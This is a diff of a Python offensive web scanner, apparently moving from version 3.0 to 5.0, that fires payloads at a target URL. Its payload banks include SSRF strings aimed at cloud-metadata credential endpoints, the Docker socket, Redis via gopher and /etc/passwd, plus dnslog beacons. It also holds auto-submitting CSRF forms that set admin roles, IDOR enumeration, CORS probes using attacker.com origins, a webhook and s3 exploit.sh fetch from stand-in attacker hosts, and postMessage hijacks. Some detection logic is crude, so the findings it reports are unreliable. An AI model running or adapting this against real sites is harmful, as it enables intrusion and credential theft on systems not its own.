@@ -1,257 +1,277 @@
 #!/usr/bin/env python3
-# ╔══════════════════════════════════════════════════════════════════════════╗
-# ║ CSRF | XSRF | SSRF Red‑Team Scanner v3.0                                 ║
-# ║ Author : Haroon Ahmad Awan · CyberZeus  (haroon@cyberzeus.pk)            ║
-# ║ Licence: MIT  (For *authorised* security testing & research only)        ║
-# ╚══════════════════════════════════════════════════════════════════════════╝
-# ────────────────────────────────────────────────────────────────────────────
-#  1) Imports & basic setup
-# ────────────────────────────────────────────────────────────────────────────
-import os, re, sys, ssl, time, random, string, logging, warnings, argparse
-import urllib.parse
+# ╔═════════════════════════════════════════════════════════════════════════╗
+# ║   v5.0 – Ultimate Forgery & SSRF Scanner Suite     ║
+# ║ Author : Haroon Ahmad Awan · CyberZeus  (haroon@cyberzeus.pk)          ║
+# ║ License: MIT  ·  Offensive testing only                                 ║
+# ╚═════════════════════════════════════════════════════════════════════════╝
+
+import os, ssl, sys, time, random, string, logging, argparse, urllib.parse, json
+import requests, bs4
 from pathlib import Path
+from fake_useragent import UserAgent
 from concurrent.futures import ThreadPoolExecutor
-import requests, bs4                                   # HTML parsing
-from fake_useragent import UserAgent                   # Fresh User‑Agents
-from playwright.sync_api import sync_playwright        # Headless browser
+from playwright.sync_api import sync_playwright
 
-warnings.filterwarnings("ignore")
+# ────────────────────────────────────────────────────────────────────────────
+# Config & Globals
+# ────────────────────────────────────────────────────────────────────────────
 ssl._create_default_https_context = ssl._create_unverified_context
+warnings = __import__('warnings'); warnings.filterwarnings("ignore")
+logging.basicConfig(level=logging.INFO, format="%(message)s")
 
-# ────────────────────────────────────────────────────────────────────────────
-#  2) Global constants
-# ────────────────────────────────────────────────────────────────────────────
-VERSION          = "3.0"
-DNSLOG_SUB       = f"ssrf{random.randint(1000,9999)}"
-DNSLOG_DOMAIN    = "1mslqu.dnslog.cn"           # out‑of‑band SSRF beacon
-LOGFILE          = Path("bandesbahan_findings.md")
-TIMEOUT_REQ      = 8                                   # seconds for HTTP req
-HEADLESS_WAIT    = 2500                                # ms wait after render
-DEFAULT_THREADS  = 14
-MAX_PAGES        = 180
+DNSLOG_DOMAIN   = "9i8j94.dnslog.cn"
+DEFAULT_THREADS = 14
+MAX_PAGES       = 150
+TIMEOUT         = 8
 
-MS_TAGS = {                                            # STRIDE‑aligned labels
-    "CSRF": ["Tampering", "Repudiation"],
-    "SSRF": ["Information Disclosure", "Elevation of Privilege"]
+UA    = UserAgent()
+LOG   = Path("_omega_report.md")
+MS_TAGS = {
+    "SSRF": ["Info Disclosure","Priv Esc"],
+    "CSRF": ["Tampering","Repudiation"],
+    "MARSF": ["Chain Exploit","Priv Injection"],
+    "RARF": ["DNS Rebind","Alias SSRF"],
+    "VREF": ["IDOR","Priv Esc"],
+    "SREF": ["Stored Abuse"],
+    "CLRF": ["CORS Bypass","Auth Leak"],
+    "EPRF": ["Message Hijack"],
+    "IMRF": ["DOM Tamper","UI Forgery"],
+    "UDRF": ["SDK Abuse"]
 }
 
-logging.basicConfig(level=logging.INFO, format="%(message)s")
-UA = UserAgent()                                       # random UA generator
+# ────────────────────────────────────────────────────────────────────────────
+# CLI
+# ────────────────────────────────────────────────────────────────────────────
+cli = argparse.ArgumentParser(description="  v5.0")
+cli.add_argument("-u","--url",      required=True, help="Target base URL")
+cli.add_argument("--threads",       type=int, default=DEFAULT_THREADS)
+cli.add_argument("--max-pages",     type=int, default=MAX_PAGES)
+cli.add_argument("--stealth",       action="store_true", default=True)
+cli.add_argument("--debug",         action="store_true")
+ARGS = cli.parse_args()
+if ARGS.debug: logging.getLogger().setLevel(logging.DEBUG)
 
 # ────────────────────────────────────────────────────────────────────────────
-#  3) CLI flags
+# Helpers
 # ────────────────────────────────────────────────────────────────────────────
-cli = argparse.ArgumentParser(
-    description="bandesbahan Ω‑Edition – Unified CSRF / XSRF / SSRF Scanner")
-cli.add_argument("-u","--url", required=True,
-                 help="Target root (e.g. https://vuln.lab)")
-cli.add_argument("--threads", type=int, default=DEFAULT_THREADS,
-                 help="Worker threads (default 14)")
-cli.add_argument("--max-pages", type=int, default=MAX_PAGES,
-                 help="Crawler cap (default 180)")
-cli.add_argument("--stealth", action="store_true", default=True,
-                 help="Enable adaptive WAF delays (default on)")
-cli.add_argument("--no-stealth", action="store_false", dest="stealth",
-                 help="Disable delays, run flat‑out")
-cli.add_argument("--debug", action="store_true")
-ARGS   = cli.parse_args()
-DEBUG  = ARGS.debug
-if DEBUG: logging.getLogger().setLevel(logging.DEBUG)
+def smart_url(u):
+    if u.startswith("http"): return u
+    for p in ("https://","http://"):
+        try:
+            if requests.head(p+u,timeout=4).ok: return p+u
+        except: pass
+    return "http://"+u
+
+def hdrs():
+    return {"User-Agent":UA.random,
+            "Referer":random.choice(["https://google.com","https://bing.com"]),
+            "Accept":"*/*"}
+
+def log(kind,url,payload,status,reason,conf):
+    tags = ", ".join(MS_TAGS.get(kind,[]))
+    e = (f"- **{kind}** `{url}`\n"
+         f"  - Status : {status} (confidence {conf:.2f})\n"
+         f"  - Reason : {reason}\n"
+         f"  - Payload: `{payload}`\n"
+         f"  - Tags   : {tags}\n")
+    with open(LOG,"a",encoding="utf-8") as f: f.write(e+"\n")
+    logging.info(e.strip().replace("\n  ","  "))
 
 # ────────────────────────────────────────────────────────────────────────────
-#  4) Payload banks
+# Payload Banks
 # ────────────────────────────────────────────────────────────────────────────
 SSRF_PAYLOADS = [
-    # Internal / cloud
+    # Basic
     "http://127.0.0.1", "http://localhost", "http://[::1]",
-    "http://169.254.169.254/latest/meta-data/",          # AWS creds
-    "http://10.0.0.1", "http://192.168.1.1",
-    "http://internal-service.default.svc.cluster.local", # k8s
-    # DNS beacon – check dnslog.cn panel
+    # Cloud metadata
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.170.2/**/latest/meta-data/iam/security-credentials/",
+    # Docker socket
+    "http://unix:@/var/run/docker.sock/info",
+    # Hex & semicolon variants
+    "http://[0x7f000001]", "http://0;127.0.0.1",
+    # FTP & Gopher
+    "ftp://anonymous@localhost/", "gopher://127.0.0.1:6379/_INFO",
+    # File
+    "file:///etc/passwd",
+    # DNS log
     f"http://{DNSLOG_DOMAIN}",
-    # Protocol smuggling
-    "gopher://127.0.0.1:6379/_PING",
-    "file:///etc/passwd"
 ]
 
 CSRF_TEMPLATES = [
-    # Classic POST form
-    """<form action="{t}" method="POST"><input name=change_email value=h@cked>
-    </form><script>document.forms[0].submit()</script>""",
-    # Iframe auto‑submit
-    """<iframe srcdoc='<form action="{t}" method="POST">
-       <input name=password value=newpass123></form>
-       <script>document.forms[0].submit()</script>'></iframe>""",
-    # GET CSRF
-    """<img src="{t}?reset=true">""",
-    # fetch() JSON CSRF
-    """<script>fetch("{t}",{method:"POST",credentials:"include",
-      headers:{{"Content-Type":"application/x-www-form-urlencoded"}},
-      body:"role=admin"})</script>""",
-    # Content‑Type: text/plain token bypass
-    """<form action="{t}" method="POST" enctype="text/plain">
-       <input name=admin value=1></form>
-       <script>document.forms[0].submit()</script>"""
+    # Classic
+    '<form method="POST" action="{t}"><input name="role" value="admin"></form><script>document.forms[0].submit()</script>',
+    # GET via IMG
+    '<img src="{t}?execute=1">',
+    # fetch JSON
+    '<script>fetch("{t}",{{method:"POST",credentials:"include"}})</script>',
+    # UTF-7
+    '<script>fetch("{t}",{{method:"POST",headers:{{"Content-Type":"+ADw-script+AD4-"}},body:"+ADw-role+AD4-admin+ADw-/role+AD4-"}})</script>',
+    # no-cors
+    '<script>fetch("{t}",{{method:"POST",mode:"no-cors",credentials:"include"}})</script>',
+    # Meta-refresh
+    '<meta http-equiv="refresh" content="2;url={t}?reset=true">',
+    # Shadow DOM
+    '<script>customElements.whenDefined("login-form").then(()=>{{let c=document.querySelector("login-form");c.shadowRoot.querySelector("[name=token]").value="att";c.shadowRoot.querySelector("form").submit();}});</script>',
+]
+
+MARSF_PAYLOADS = [
+    {"role":"Admin","target_service":"privileged_backend"},
+    {"chain":[{"service":"user"},{"service":"admin_backend"}]},
+]
+
+VREF_IDS = [f"{i:04d}-0000-0000-0000-0000000000AA" for i in range(1000,1010)]
+
+RARF_DOMAINS = [
+    f"http://internal.service.{DNSLOG_DOMAIN}",
+    "http://[0x7f000001]",
+    "ftp://anonymous@localhost/",
+    "http://0;127.0.0.1"
+]
+
+CLRF_ORIGINS = [
+    "null","http://evil.com","http://attacker.com","http://sub.evil.com"
+]
+
+SREF_PAYLOADS = [
+    {"cmd":"restart","submit":"yes"},
+    {"cron":"* * * * *","payload":"rm -rf /tmp/cache"},
+    {"webhook_url":"https://attacker.com/callback?exec=1"}
+]
+
+EPRF_SCRIPTS = [
+    '<iframe src="{u}" onload="this.contentWindow.postMessage(\'{{\"cmd\":\"transfer\",\"amt\":9999}}\',"*")"></iframe>',
+    '<script>new BroadcastChannel("app").postMessage({cmd:"shutdown"});</script>'
+]
+
+IMRF_SCRIPTS = [
+    '<script>setTimeout(()=>{let f=document.forms[0];let i=document.createElement("input");i.name="admin_override";i.value="1";i.type="hidden";f.appendChild(i);f.submit();},500);</script>',
+    '<script>document.querySelector("login-form").shadowRoot.querySelector("input[name=pw]").value="pwned";document.querySelector("login-form").shadowRoot.querySelector("form").submit();</script>'
+]
+
+UDRF_PAYLOADS = [
+    {"url":"file:///etc/passwd"},
+    {"url":"s3://attacker.bucket/exploit.sh"},
+    {"target":"unix:/var/run/docker.sock","cmd":"INFO"}
 ]
 
 # ────────────────────────────────────────────────────────────────────────────
-#  5) Helper functions
+# Exploit Functions
 # ────────────────────────────────────────────────────────────────────────────
-def hdrs():
-    """Return randomised headers for each request."""
-    return {
-        "User-Agent": UA.random,
-        "Referer": random.choice(["https://google.com","https://bing.com"]),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
-    }
-
-def adaptive_sleep(status:int|None)->None:
-    """AI‑style back‑off to dodge WAF / rate limits."""
-    if not ARGS.stealth: return
-    rng = (0.8,2.5)
-    if status in {403,429,503}: rng = (10,20)
-    elif status in {301,302}:   rng = (3,6)
-    time.sleep(random.uniform(*rng))
-
-def smart_url(b:str)->str:
-    """Force HTTPS first; fall back to HTTP."""
-    if b.startswith("http"): return b
-    for s in ("https://","http://"):
+def exploit_ssrf(u):
+    for pl in SSRF_PAYLOADS:
         try:
-            if requests.head(s+b,timeout=4).ok: return s+b
-        except: pass
-    return "http://"+b
-
-def md_log(kind:str, url:str, payload:str,
-           status:str, reason:str, conf:float)->None:
-    """Write one finding line into the Markdown report."""
-    tags = ", ".join(MS_TAGS.get(kind, []))
-    entry = (f"- **{kind}** `{url}`\n"
-             f"  - Status : {status}  (confidence {conf:.2f})\n"
-             f"  - Reason : {reason}\n"
-             f"  - Payload: `{payload[:80]}`\n"
-             f"  - Tags   : {tags}\n")
-    LOGFILE.parent.mkdir(exist_ok=True)
-    with open(LOGFILE,"a",encoding="utf-8") as f: f.write(entry)
-    logging.info(entry.strip().replace("\n  ","  "))
-
-# ────────────────────────────────────────────────────────────────────────────
-#  6) Crawler – links, forms, JS endpoints
-# ────────────────────────────────────────────────────────────────────────────
-_JS_URL = re.compile(
-    r'(?:fetch\(|axios\.(?:get|post)\(|XMLHttpRequest\(.+?open\()'
-    r'\s*["\']([^"\']+)["\']', re.I)
-
-def crawl(root:str, cap:int):
-    seen, queue, targets = set(), [root], []
-    domain = urllib.parse.urlparse(root).netloc
-    while queue and len(seen) < cap:
-        url = queue.pop(0)
-        seen.add(url)
-        try:
-            r = requests.get(url, headers=hdrs(), timeout=TIMEOUT_REQ)
-            adaptive_sleep(r.status_code)
-            if "text/html" not in r.headers.get("Content-Type",""): continue
+            r = requests.get(u, params={"url":pl}, headers=hdrs(), timeout=TIMEOUT)
+            adaptive = (time.sleep(random.uniform(0.5,1.5)))
+            b = r.text.lower()
+            if "root:x" in b:
+                log("SSRF", u, pl, "Confirmed", "/etc/passwd leaked",0.95); return
+            if DNSLOG_DOMAIN in pl:
+                log("SSRF", u, pl, "Blind", "OOB beacon",0.65)
         except: continue
 
-        soup = bs4.BeautifulSoup(r.text,"html.parser")
-
-        #  a) <a href>
-        for a in soup.find_all("a",href=True):
-            full = urllib.parse.urljoin(url,a["href"])
-            if urllib.parse.urlparse(full).netloc == domain and full not in seen:
-                queue.append(full)
-            if "?" in full:
-                p = urllib.parse.urlparse(full)
-                qs= list(urllib.parse.parse_qs(p.query))
-                if qs: targets.append({"url":p._replace(query="").geturl(),
-                                       "method":"GET","params":qs})
-
-        #  b) <form>
-        for f in soup.find_all("form"):
-            act=urllib.parse.urljoin(url,f.get("action") or url)
-            if urllib.parse.urlparse(act).netloc != domain: continue
-            names=[i.get("name") for i in f.find_all("input",{"name":True})]
-            if names:
-                targets.append({"url":act,"method":f.get("method","GET").upper(),
-                                "params":names})
-
-        #  c) JS‑defined endpoints
-        for u in _JS_URL.findall(r.text):
-            full=urllib.parse.urljoin(url,u)
-            if urllib.parse.urlparse(full).netloc==domain and "?" in full:
-                p=urllib.parse.urlparse(full); qs=list(urllib.parse.parse_qs(p.query))
-                if qs: targets.append({"url":p._replace(query="").geturl(),
-                                       "method":"GET","params":qs})
-    return targets
-
-# ────────────────────────────────────────────────────────────────────────────
-#  7) CSRF verifier (headless Firefox)
-# ────────────────────────────────────────────────────────────────────────────
-def verify_csrf(html:str)->bool:
-    try:
-        with sync_playwright() as p:
-            b=p.firefox.launch(headless=True,args=["--no-sandbox"])
-            ctx=b.new_context(); pg=ctx.new_page()
-            pg.set_content(html,wait_until="domcontentloaded")
-            pg.wait_for_timeout(HEADLESS_WAIT)
-            ok="captcha" not in pg.content().lower()
-            ctx.close(); b.close(); return ok
-    except: return False
-
-# ────────────────────────────────────────────────────────────────────────────
-#  8) The actual scanner
-# ────────────────────────────────────────────────────────────────────────────
-def scan(target):
-    url,method,params = target["url"],target["method"],target["params"]
-
-    # A) SSRF fuzz
-    for pl in SSRF_PAYLOADS:
-        data={p:pl for p in params}
+def exploit_csrf(u):
+    for tpl in CSRF_TEMPLATES:
+        html = tpl.format(t=u)
         try:
-            r=(requests.get if method=="GET" else requests.post)(
-                url, params=data if method=="GET" else None,
-                data=data   if method=="POST" else None,
-                headers=hdrs(), timeout=TIMEOUT_REQ)
-            adaptive_sleep(r.status_code)
-            body=r.text.lower()
-        except:
-            adaptive_sleep(None)
-            continue
+            with sync_playwright() as p:
+                b = p.firefox.launch(headless=True)
+                pg = b.new_context().new_page()
+                pg.set_content(html); pg.wait_for_timeout(1500)
+                if "error" not in pg.content().lower():
+                    log("CSRF", u, tpl, "Suspected", "Auto-submit succeeded",0.60); b.close(); return
+                b.close()
+        except: continue
 
-        # evidence scoring
-        if "root:x" in body:
-            md_log("SSRF",url,pl,"Confirmed","/etc/passwd snippet",0.95); return
-        if "localhost" in body:
-            md_log("SSRF",url,pl,"Confirmed","string 'localhost' reflected",0.80);return
-        if DNSLOG_DOMAIN in pl:
-            md_log("SSRF",url,pl,"Suspected","Blind beacon – check dnslog.cn",0.50)
+def exploit_marsf(u):
+    for pl in MARSF_PAYLOADS:
+        try:
+            r = requests.post(u+"/api/user/4711/roles", json=pl, headers=hdrs(), timeout=TIMEOUT)
+            if r.status_code==200 and "admin" in r.text.lower():
+                log("MARSF", u, json.dumps(pl), "Confirmed", "Chain exploit",0.90); return
+        except: continue
 
-    # B) CSRF / XSRF fuzz (POST only)
-    if method=="POST":
-        for tpl in CSRF_TEMPLATES:
-            html=tpl.format(t=url)
-            if verify_csrf(html):
-                reason="Form auto‑submitted – verify server‑side effect"
-                md_log("CSRF",url,html.strip(),"Suspected",reason,0.60);return
+def exploit_vref(u):
+    for vid in VREF_IDS:
+        try:
+            r = requests.get(f"{u}/user/{vid}", headers=hdrs(), timeout=TIMEOUT)
+            if r.status_code==200 and "admin" in r.text.lower():
+                log("VREF", f"{u}/user/{vid}", vid, "Confirmed","ID tamper",0.85); return
+        except: continue
+
+def exploit_rarf(u):
+    for d in RARF_DOMAINS:
+        try:
+            r = requests.get(d, timeout=TIMEOUT)
+            if r.status_code==200:
+                log("RARF", u, d, "Confirmed","Alias SSRF",0.75); return
+        except: continue
+
+def exploit_clrf(u):
+    for o in CLRF_ORIGINS:
+        try:
+            r = requests.options(u, headers={"Origin":o}, timeout=TIMEOUT)
+            if "access-control-allow-origin" in r.headers and o in r.headers["access-control-allow-origin"]:
+                log("CLRF", u, f"Origin: {o}","Confirmed","CORS bypass",0.80); return
+        except: continue
+
+def exploit_sref(u):
+    for pl in SREF_PAYLOADS:
+        try:
+            requests.post(u+"/iot/config", data=pl, timeout=TIMEOUT)
+            time.sleep(1)
+            r2 = requests.get(u+"/iot/status", timeout=TIMEOUT)
+            if any(k in r2.text.lower() for k in ["restarting","updated"]):
+                log("SREF", u, json.dumps(pl),"Confirmed","Stored job executed",0.78); return
+        except: continue
+
+def exploit_eprf(u):
+    for scr in EPRF_SCRIPTS:
+        html = scr.format(u=u)
+        try:
+            with sync_playwright() as p:
+                b = p.chromium.launch(headless=True)
+                pg = b.new_context().new_page()
+                pg.set_content(html); pg.wait_for_timeout(1500)
+                if "success" in pg.content().lower():
+                    log("EPRF", u, scr,"Confirmed","Message hijack",0.88); b.close(); return
+                b.close()
+        except: continue
+
+def exploit_imrf(u):
+    for scr in IMRF_SCRIPTS:
+        html = f'<form action="{u}" method="POST"><input name="user" value="admin"></form>{scr}'
+        try:
+            with sync_playwright() as p:
+                b = p.firefox.launch(headless=True)
+                pg = b.new_context().new_page()
+                pg.set_content(html); pg.wait_for_timeout(1500)
+                if "dashboard" in pg.content().lower():
+                    log("IMRF", u, scr,"Confirmed","DOM tampered",0.95); b.close(); return
+                b.close()
+        except: continue
+
+def exploit_udrf(u):
+    for pl in UDRF_PAYLOADS:
+        try:
+            r = requests.post(u+"/sdk/relay", json=pl, timeout=TIMEOUT)
+            if r.status_code==200 and ("root:x" in r.text.lower() or "exploit.sh" in r.text.lower()):
+                log("UDRF", u, json.dumps(pl),"Confirmed","SDK relay abuse",0.92); return
+        except: continue
 
 # ────────────────────────────────────────────────────────────────────────────
-#  9) Main routine
+# Main
 # ────────────────────────────────────────────────────────────────────────────
 def main():
-    root=smart_url(ARGS.url.rstrip("/"))
-    if not LOGFILE.exists():
-        LOGFILE.write_text(f"# bandesbahan Findings v{VERSION}\n\n","utf-8")
-    logging.info(f"🔥 bandesbahan Ω‑Edition {VERSION}")
-    logging.info(f"[»] Crawl start → {root}")
-    targets=crawl(root,ARGS.max_pages)
-    logging.info(f"[+] Identified {len(targets)} fuzzable endpoints\n")
-
+    root = smart_url(ARGS.url.rstrip("/"))
+    if not LOG.exists(): LOG.write_text("#   Findings\n\n",encoding="utf-8")
+    logging.info(f"🔥   v5.0 scanning {root}")
+    funcs = [exploit_ssrf, exploit_csrf, exploit_marsf, exploit_vref,
+             exploit_rarf, exploit_clrf, exploit_sref, exploit_eprf,
+             exploit_imrf, exploit_udrf]
     with ThreadPoolExecutor(max_workers=ARGS.threads) as pool:
-        pool.map(scan,targets)
+        for fn in funcs:
+            pool.submit(fn, root)
 
-    logging.info(f"[✓] Done – report → {LOGFILE.resolve()}")
-    logging.info(f"[i] Blind‑SSRF beacons used dnslog host → {DNSLOG_DOMAIN}")
-
-if __name__=="__main__":
+if __name__ == "__main__":
     main()
